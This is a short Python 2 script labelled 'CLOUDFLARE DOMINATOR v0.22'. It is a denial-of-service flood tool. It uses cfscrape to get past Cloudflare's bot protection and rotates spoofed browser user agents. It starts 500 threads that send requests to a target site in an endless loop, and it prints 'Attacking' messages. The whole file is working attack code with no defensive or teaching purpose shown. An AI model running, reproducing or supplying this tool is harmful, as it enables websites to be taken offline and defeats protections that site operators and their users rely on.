import requests
import cfscrape
import sys
import random
import re
import string
import threading
import time
headers_useragents=[]
headers_referers=[]
scraper = cfscrape.create_scraper() # returns a requests.Session object
host = sys.argv[1]
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0')
	headers_useragents.append('Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285')
	headers_useragents.append('Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16')
	headers_useragents.append('Mozilla/5.0 (IE 11.0; Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre')
	headers_useragents.append('Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Maxthon/3.0.6.27 Safari/532.4')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 1063; ru-ru) AppleWebKit/533.16 (KHTML like Gecko) Version/5.0 Safari/533.1 Maxthon')
	return(headers_useragents)
	
	
def referer_list():
	global headers_referers
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)
useragent_list()
referer_list()
threads=[]
print '------------------------------------------------------------------'
print '()==[:::::::::::::> CLOUDFLARE DOMINATOR v0.22 ()==[:::::::::::::>'
print '------------------------------------------------------------------'

print "Attacking ()==[:::::::::::::> "+host

class attack(threading.Thread):
	def run(self):
		useragent_list()
		referer_list()
		i=0
		while True: 
			try:
				headers = {'Keep-Alive':random.randint(110,120),'Connection':'keep-alive','Cache-Control':'no-cache','User-Agent':random.choice(headers_useragents)}
				scraper.get(host,headers=headers)
			except requests.exceptions.RequestException:
				i += 1 
				print 'Failed Attack Attempt No  : ' + str(i)
				
for x in range(500):
        a = attack()
        a.start()

